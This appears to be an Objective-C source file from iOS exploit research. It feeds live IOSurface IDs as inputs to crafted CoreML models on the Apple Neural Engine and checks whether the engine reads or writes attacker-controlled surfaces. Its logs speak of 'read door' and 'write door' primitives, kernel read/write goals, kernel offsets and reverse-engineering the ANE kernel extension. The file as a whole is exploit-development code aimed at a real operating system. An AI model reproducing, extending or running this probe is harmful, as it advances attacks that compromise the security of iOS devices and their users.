//
//  ANEYcraft.m — twin y-craft branch table. See ANEYcraft.h.
//

#import "ANEYcraft.h"
#import "KReader.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <math.h>
#import <string.h>
#import <sys/sysctl.h>
#import <unistd.h>

#define ANE_BUILD     @"0.8.0-ane-ycraft-v1"
#define ANE_MODEL_A   @"XVRC27_127in_1out"
#define ANE_MODEL_B   @"XVRC27_127inmin_1out"
#define ANE_N_IN      127u
#define ANE_N_SURF    412u
#define ANE_CAP_MARK  0x53535353u
#define ANE_ZERO      0x00000000u
#define ANE_REPS      20u
#define ANE_ENGAGE_MS 1.0

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*ane_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*ane_iosGetID_t)(IOSurfaceRef);
typedef void *(*ane_iosBase_t)(IOSurfaceRef);
typedef size_t (*ane_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*ane_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} ane_surf_t;

static int g_ane_fd = -1;
static NSMutableString *g_ane_buf;

static NSString *ANELogPath(void) {
    return @"/var/mobile/Documents/lum1na-fkt-ane.txt";
}

static void ane_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([ANEYcraft class]) {
        if (g_ane_buf) [g_ane_buf appendString:out];
        if (g_ane_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_ane_fd, s, strlen(s));
                fcntl(g_ane_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface helpers (same ABI as P007 P080)

static ane_iosCreate_t  s_iosCreate;
static ane_iosGetID_t   s_iosGetID;
static ane_iosBase_t    s_iosBase;
static ane_iosAllocSz_t s_iosAllocSz;
static ane_iosLock_t    s_iosLock;
static ane_iosLock_t    s_iosUnlock;

static BOOL ane_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (ane_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (ane_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (ane_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (ane_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (ane_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (ane_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef ane_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef ane_surface_create(void) {
    CFNumberRef w = ane_cfnum(1), h = ane_cfnum(1);
    CFNumberRef bpe = ane_cfnum(4), fmt = ane_cfnum(0x42475241);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static void ane_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
}

static BOOL ane_surface_scan_pattern(ane_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    uint8_t first[16];
    memcpy(first, b, sizeof(first));
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        ane_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                label, e->sid, diffOff, diffCnt);
        ane_log(@"      first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                first[0], first[1], first[2], first[3], first[4], first[5],
                first[6], first[7], first[8], first[9], first[10], first[11],
                first[12], first[13], first[14], first[15]);
        return YES;
    }
    return NO;
}

static uint32_t ane_scan_all(ane_surf_t *surfs, uint32_t made, ane_surf_t *cap,
                             const char *label) {
    uint32_t hits = 0;
    for (uint32_t i = 0; i < made; i++) {
        ane_surf_t *e = &surfs[i];
        if (e == cap) continue;
        if (ane_surface_scan_pattern(e, [[NSString stringWithFormat:@"%s[%u]", label, i]
                                          UTF8String], ANE_ZERO)) hits++;
        if (hits >= 8) { ane_log(@"  [!] scan aborted early (8 hits)"); break; }
    }
    if (ane_surface_scan_pattern(cap, [[NSString stringWithFormat:@"%s[cap]", label]
                                        UTF8String], ANE_CAP_MARK)) hits++;
    return hits;
}

/* fp16 serial sum — mirrors the ANE add chain layer by layer. */
static double ane_fp16_serial_sum(const double *v, uint32_t n) {
    __fp16 acc = (__fp16)0.0f;
    for (uint32_t i = 0; i < n; i++)
        acc = (__fp16)((float)acc + (float)v[i]);
    return (double)(float)acc;
}

#pragma mark - CoreML

static NSURL *ane_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *ane_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *ane_provider_sids(const ane_surf_t *surfs,
                                                      uint32_t nIn, NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @((double)surfs[i].sid);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double ane_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                          NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *ane_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

static void ane_finish(uint32_t made, ane_surf_t *surfs) {
    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);
    if (g_ane_fd >= 0) { fcntl(g_ane_fd, F_FULLFSYNC); close(g_ane_fd); g_ane_fd = -1; }
}

static NSString *ane_return(void) {
    NSString *ret = g_ane_buf;
    g_ane_buf = nil;
    return ret;
}

@implementation ANEYcraft

+ (NSString *)dumpPath { return ANELogPath(); }

+ (NSString *)run {
    g_ane_buf = [NSMutableString string];
    g_ane_fd = open(ANELogPath().fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    char rel[256] = {0}, osv[64] = {0};
    size_t n = sizeof(rel); sysctlbyname("kern.osrelease", rel, &n, NULL, 0);
    n = sizeof(osv); sysctlbyname("kern.osversion", osv, &n, NULL, 0);

    ane_log(@"=== lum1na-fkt ANE y-craft %@ BUILD %@ ===", [NSDate date], ANE_BUILD);
    ane_log(@"osrelease=%s osversion=%s device=iPhone13,1 (A14 twin)", rel, osv);
    ane_log(@"Twin mechanism run of P007 P080: 127 live-sid inputs, read-door");
    ane_log(@"differential (model A) + write door (model B, y = MIN(sum, x_000)).");
    ane_log(@"Twin rule: mechanism/class/field# transfers to 23F77 — never KVAs.");
    ane_log(@"Kernel-side record dump pending FKT_21D50.h H11ANEIn offsets.");
    if (strcmp(osv, "21D50") != 0)
        ane_log(@"[!] osversion is NOT 21D50 — twin interpretation needs care.");

    if (!ane_resolve_iosurface()) {
        ane_log(@"[-] IOSurface dlsym FAILED — abort");
        ane_log(@"=== VERDICT === abort (iosurface)");
        ane_finish(0, NULL);
        return ane_return();
    }

    /* ---- surfaces: candidates 0..made-2 are the 127 inputs; last = capture ---- */
    ane_surf_t *surfs = calloc(ANE_N_SURF, sizeof(ane_surf_t));
    uint32_t made = 0;
    for (uint32_t i = 0; i < ANE_N_SURF; i++) {
        IOSurfaceRef s = ane_surface_create();
        if (!s) continue;
        surfs[made].surf = s;
        surfs[made].sid = s_iosGetID(s);
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    ane_log(@"[+] surfaces: %u/%u", made, ANE_N_SURF);
    if (made < ANE_N_IN + 2) {
        ane_log(@"[-] need >= %u surfaces — abort", ANE_N_IN + 2);
        ane_log(@"=== VERDICT === abort (surfaces)");
        ane_finish(made, surfs);
        return ane_return();
    }
    ane_surf_t *cap = &surfs[made - 1];
    uint32_t nCand = made - 1;

    uint32_t maxSid = 0;
    for (uint32_t i = 0; i < made; i++) {
        ane_surface_fill_u32(surfs[i].surf, (&surfs[i] == cap) ? ANE_CAP_MARK : ANE_ZERO);
        if (i < nCand && surfs[i].sid > maxSid) maxSid = surfs[i].sid;
    }
    ane_log(@"[+] capture sid_C=%u; %u candidate sids in [%u..%u] (fp16-exact %s)",
            cap->sid, nCand, surfs[0].sid, surfs[nCand - 1].sid,
            maxSid <= 2048 ? @"YES" : @"NO");
    ane_log(@"[+] x_000 = sid %u (model-B write target = candidate 0)", surfs[0].sid);

    /* ---- load models ---- */
    NSError *err = nil;
    NSURL *urlA = ane_model_url(ANE_MODEL_A);
    NSURL *urlB = ane_model_url(ANE_MODEL_B);
    MLModel *modelA = ane_load(urlA, MLComputeUnitsAll, &err);
    if (!modelA) {
        ane_log(@"[-] load A FAILED: %@", err.localizedDescription ?: @"-");
        ane_log(@"=== VERDICT === abort (load A)");
        ane_finish(made, surfs);
        return ane_return();
    }
    MLModel *modelACpu = ane_load(urlA, MLComputeUnitsCPUOnly, &err);
    MLModel *modelB = ane_load(urlB, MLComputeUnitsAll, &err);
    ane_log(@"[+] A loaded (All); cpuOnly twin %@; B(%@) %@",
            modelACpu ? @"loaded" : @"FAILED", ANE_MODEL_B, modelB ? @"loaded" : @"FAILED");

    MLDictionaryFeatureProvider *fp = ane_provider_sids(surfs, ANE_N_IN, &err);
    if (!fp) {
        ane_log(@"[-] provider FAILED: %@", err.localizedDescription ?: @"-");
        ane_log(@"=== VERDICT === abort (provider)");
        ane_finish(made, surfs);
        return ane_return();
    }

    double xs[ANE_N_IN];
    double dblSum = 0;
    for (uint32_t i = 0; i < ANE_N_IN; i++) { xs[i] = (double)surfs[i].sid; dblSum += xs[i]; }
    double fp16Sum = ane_fp16_serial_sum(xs, ANE_N_IN);
    ane_log(@"[+] expectations: fp16-serial-sum(sids)=%.6e  double-sum=%.6e  zero-if-surface-read",
            fp16Sum, dblSum);

    /* ---- PHASE G: engagement gate on model A with live sids ---- */
    ane_log(@"--- PHASE G: engagement gate (live sids, 128 records/predict) ---");
    double yW = NAN;
    NSTimeInterval d = 0;
    NSTimeInterval minAll = 1e9, minCpu = 1e9;
    for (uint32_t r = 0; r < ANE_REPS; r++) {
        err = nil;
        yW = ane_predict(modelA, fp, &d, &err);
        if (r == 0 && err) ane_log(@"[!] W0 err: %@", err.localizedDescription ?: @"-");
        if (d < minAll) minAll = d;
    }
    if (modelACpu) {
        for (uint32_t r = 0; r < ANE_REPS; r++) {
            NSTimeInterval dc = 0;
            err = nil;
            ane_predict(modelACpu, fp, &dc, &err);
            if (dc < minCpu) minCpu = dc;
        }
    }
    BOOL engaged = modelACpu && (minAll > minCpu + ANE_ENGAGE_MS / 1000.0);
    ane_log(@"[*] GATE y=%@ minAll=%.2fms minCpu=%.2fms delta=%.2fms -> ANE %s (17.3 espresso)",
            ane_yfmt(yW), minAll * 1000.0, minCpu * 1000.0,
            (minAll - minCpu) * 1000.0, engaged ? "ENGAGED" : "NOT ENGAGED");
    uint32_t hitsG = ane_scan_all(surfs, made, cap, "G");
    ane_log(@"[*] G scan hits=%u", hitsG);

    if (!engaged) {
        ane_log(@"=== VERDICT ===");
        ane_log(@"ANE NOT ENGAGED on 17.3 espresso with 127 live-sid inputs");
        ane_log(@"(minAll %.2fms vs minCpu %.2fms). If P007 P080 also reports", minAll * 1000.0, minCpu * 1000.0);
        ane_log(@"NOT ENGAGED, the input-count driver theory is version-stable.");
        ane_log(@"If P080 IS engaged, specialization differs by build — the twin");
        ane_log(@"answer is 17.3-specific, not mechanism.");
        ane_log(@"Honesty: hasKread=NO hasKwrite=NO. One run per app launch advised.");
        ane_finish(made, surfs);
        return ane_return();
    }

    /* ---- PHASE A: read-door differential on model A ---- */
    ane_log(@"--- PHASE A: read-door differential (contents staged 0.0) ---");
    err = nil;
    double yA = ane_predict(modelA, fp, &d, &err);
    ane_log(@"[*] A1 y=%@ t=%.2fms err=%@",
            ane_yfmt(yA), d * 1000.0, err.localizedDescription ?: @"none");
    BOOL copyIntoOurs = (ane_scan_all(surfs, made, cap, "A") > 0);
    int aBranch;
    if (yA == 0.0)              aBranch = 1;
    else if (yA == fp16Sum)     aBranch = 2;
    else if (yA == dblSum)      aBranch = 3;
    else                        aBranch = 4;
    ane_log(@"[*] A branch: %d (%@)", aBranch,
            aBranch == 1 ? @"ANE READ OUR WIRED SURFACES — READ DOOR SHAPE" :
            aBranch == 2 ? @"client copies x VALUES into ANE staging (fp16)" :
            aBranch == 3 ? @"CPU fallback (double exact) — request likely aborted" :
            @"UNEXPECTED y — inspect");
    if (copyIntoOurs)
        ane_log(@"[!] candidate surfaces TOUCHED after A — espresso copies inputs");
    ane_log(@"    INTO the fetched surfaces (staging = ours). Re-stage before B.");

    /* ---- PHASE B: write door on model B ---- */
    BOOL capHitB = NO;
    double yB1 = NAN, yB2 = NAN, yB3 = NAN;
    if (modelB) {
        if (copyIntoOurs)
            for (uint32_t i = 0; i < made; i++)
                if (&surfs[i] != cap) ane_surface_fill_u32(surfs[i].surf, ANE_ZERO);

        ane_log(@"--- PHASE B: write door (y = MIN(sum,x_000) == sid %u) ---", surfs[0].sid);
        err = nil;
        yB1 = ane_predict(modelB, fp, &d, &err);
        ane_log(@"[*] B1 y=%@ t=%.2fms (expect %.6e) err=%@",
                ane_yfmt(yB1), d * 1000.0, (double)surfs[0].sid,
                err.localizedDescription ?: @"none");
        ane_log(@"    B1 error echo = OUTPUT record sid evidence (prev-y state).");
        (void)ane_scan_all(surfs, made, cap, "B1");

        for (uint32_t i = 0; i < made; i++)
            if (&surfs[i] != cap) ane_surface_fill_u32(surfs[i].surf, ANE_ZERO);

        ane_log(@">>> B2 = WRITE-DOOR predict (output record sid = prev y = %u = OURS) <<<",
                surfs[0].sid);
        err = nil;
        yB2 = ane_predict(modelB, fp, &d, &err);
        ane_log(@"[*] B2 y=%@ t=%.2fms err=%@",
                ane_yfmt(yB2), d * 1000.0, err.localizedDescription ?: @"none");
        capHitB = (ane_scan_all(surfs, made, cap, "B2") > 0);

        err = nil;
        yB3 = ane_predict(modelB, fp, &d, &err);
        ane_log(@"[*] B3 y=%@ t=%.2fms (stability) err=%@",
                ane_yfmt(yB3), d * 1000.0, err.localizedDescription ?: @"none");
        if (ane_scan_all(surfs, made, cap, "B3") > 0) capHitB = YES;
    } else {
        ane_log(@"[-] model B load FAILED — write door skipped");
    }

    /* ---- verdict ---- */
    ane_log(@"=== VERDICT ===");
    if (capHitB) {
        ane_log(@"WRITE DOOR OPEN ON THE TWIN: an OUR-surface was written through");
        ane_log(@"the crafted output record (sid = prev y = x_000 = live armed surface).");
        ane_log(@"This is the P007 Stage-B premise CONFIRMED as mechanism on 17.3.");
        ane_log(@"Re-run on 23F77 (p080) to check build-stability of the behavior.");
        ane_log(@"Honesty: own-surface write only. hasKread=NO hasKwrite=NO.");
    } else if (aBranch == 1) {
        ane_log(@"READ DOOR SHAPE ON THE TWIN: y==0.0 with contents staged zero — the");
        ane_log(@"ANE read our wired input surfaces. Output record sid != prev y");
        ane_log(@"(B1 y=%@ vs expected %u) — the output-side client fill differs",
                ane_yfmt(yB1), surfs[0].sid);
        ane_log(@"from the input side. NEXT: Ghidra pass on 21D50 ANE kext (FktKRW)");
        ane_log(@"to name who writes MemoryMapRequest output entry field[0].");
    } else if (aBranch == 2) {
        ane_log(@"CLIENT-VALUE PATH ON THE TWIN: y==fp16-serial-sum(sids) — espresso");
        ane_log(@"copies x VALUES into its own staging; fetched surfaces are not read.");
        ane_log(@"If P080 matches: input-side content staging is dead as MECHANISM");
        ane_log(@"across builds — the sid story must live in the record builder.");
    } else {
        ane_log(@"Engaged but inconclusive. A y=%@ (fp16sum=%.6e dblsum=%.6e)",
                ane_yfmt(yA), fp16Sum, dblSum);
        ane_log(@"B1 y=%@ B2 y=%@ capHit=%d. Compare line-by-line with p080's log.",
                ane_yfmt(yB1), ane_yfmt(yB2), capHitB);
    }
    ane_log(@"Twin honesty: mechanism transfers, offsets never. hasKread=NO hasKwrite=NO.");
    ane_log(@"Compare this file with P007 Documents/p080_ane_ycraft127_log.txt.");

    ane_finish(made, surfs);
    return ane_return();
}

@end